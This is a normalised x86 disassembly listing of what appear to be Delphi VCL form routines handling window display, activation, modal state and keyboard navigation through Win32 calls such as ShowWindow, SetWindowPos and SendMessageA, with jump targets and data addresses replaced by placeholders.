mov eax [ eax + 0xc ]
call sub_446d00
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416efc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_449938
lea eax [ ebp - 0x1c ]
call sub_406b44
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_46561c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_46565c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_469d2c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_469d94
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_469d94
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_465694
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416efc
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_449938
lea eax [ ebp - 0x1c ]
call sub_406b44
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_469cc4
test [ esi + 0x228 ] 0x8
je r-xdata
sub_465828
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_46589c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4658c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ecb8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4638d8
lea edx [ ebp - 0x14 ]
call sub_4670a0
push ebp
mov eax [ ebp - 0x4 ]
call sub_4638d8
lea edx [ ebp - 0x24 ]
call sub_4670a0
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_46589c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4638d8
lea edx [ ebp - 0x24 ]
call sub_4670a0
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_46589c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46589c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46589c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_465980
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403350
pop esi
pop ebx
retn
sub_4659a4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403350
pop esi
pop ebx
retn
sub_4659c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44fb98
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_450c50
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_450c50
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_465a64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465fce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46a178
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_465fb1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fb8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
push ebp
push j_sub_40361c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_40361c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464c10
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dc74
jmp r-xdata
mov eax [ rw-data ]
call sub_4672fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449824
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_45071c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4672f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449868
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
call sub_460858
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46732c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449824
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4672fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44a080
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_467320
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449868
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4672f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463ec0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463ec0
jmp r-xdata
sub_465b21
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46988c
call sub_403984
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4672fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449824
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4672f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449868
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46732c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449824
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4672fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fb8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44a080
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_467320
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_449868
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4672f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_463ec0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_463ec0
jmp r-xdata
sub_465ebd
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46988c
call sub_403984
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464c10
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44dc74
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_45071c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465fb8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45071c
call sub_460858
mov ebx eax
sub_466004
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_46605c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4660ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_4660c8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403350
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4660f4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_469878
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403350
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_466294
jmp r-xdata
mov eax ebx
call sub_466330
mov dl 0x1
mov eax ebx
call sub_463e80
jmp r-xdata
sub_466198
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_46380c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_463858
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4661fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466268
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403350
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466330
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4662b4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_466322
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466329
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_464b0c
sub_46634c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466614
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_448680
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4687ec
xor edx edx
push ebp
push sub_4665f7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41862c
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46781c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_460708
